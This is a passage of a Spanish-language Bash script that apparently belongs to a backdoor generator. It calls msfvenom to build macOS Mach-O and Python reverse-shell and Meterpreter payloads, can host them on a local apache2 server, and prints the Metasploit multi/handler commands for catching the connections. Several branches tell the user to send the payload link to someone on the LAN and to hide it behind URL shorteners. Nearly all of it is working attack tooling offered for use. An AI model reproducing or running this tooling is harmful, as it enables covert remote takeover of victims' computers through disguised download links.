			mv $nombre.macho Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $ruta/$nombre.macho
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 
 

	elif [[ $optiondos == 5 || $optiondos == 05 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mosx/x64/shell_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .macho > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .macho al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .macho. Tambien si quieres que el .macho se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .macho al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p osx/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /var/www/html/$nombre.macho
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.macho \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.macho
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $nombre.macho 
			mv $nombre.macho Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $ruta/$nombre.macho
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	elif [[ $optiondos == 6 || $optiondos == 06 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mosx/x86/shell_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .macho > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .macho al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .macho. Tambien si quieres que el .macho se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .macho al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /var/www/html/$nombre.macho
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.macho \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.macho
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $nombre.macho 
			mv $nombre.macho Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $ruta/$nombre.macho
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload osx/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	fi
fi
if [[ $option == 5 || $option == 05 ]]; then 
clear
banner7
echo -e                  "\e[0;36m[\e[0;34m01\e[0;36m] \e[1;36mpython/meterpreter_reverse_http "
echo -e                  "\e[0;36m[\e[0;34m02\e[0;36m] \e[1;36mpython/meterpreter_reverse_https"
echo -e                  "\e[0;36m[\e[0;34m03\e[0;36m] \e[1;36mpython/meterpreter_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m04\e[0;36m] \e[1;36mpython/meterpreter/reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m05\e[0;36m] \e[1;36mpython/shell_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m06\e[0;36m] \e[1;36mpython/shell_reverse_tcp_ssl"
echo -e                  "\e[0;36m[\e[0;34m07\e[0;36m] \e[1;36mpython/shell_reverse_udp"
echo ""

read -p $"Payload > " optiondos
	if [[ $optiondos == 1 || $optiondos == 01 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mpython/meterpreter_reverse_http"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .py > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .py al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .py. Tambien si quieres que el .py se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .py al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p python/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.py
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.py \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.py
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f raw > $nombre.py 
			mv $nombre.py Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.py
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

	elif [[ $optiondos == 2 || $optiondos == 02 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mpython/meterpreter_reverse_https"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .py > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .py al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .py. Tambien si quieres que el .py se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .py al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p python/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.py
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.py \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .macho del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.py
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f raw > $nombre.py 
			mv $nombre.py Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p python/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f raw > $ruta/$nombre.py
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	elif [[ $optiondos == 3 || $optiondos == 03 ]]; then 
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mpython/meterpreter_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .py > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .py al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .py. Tambien si quieres que el .py se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .py al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p python/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /var/www/html/$nombre.py
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload python/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
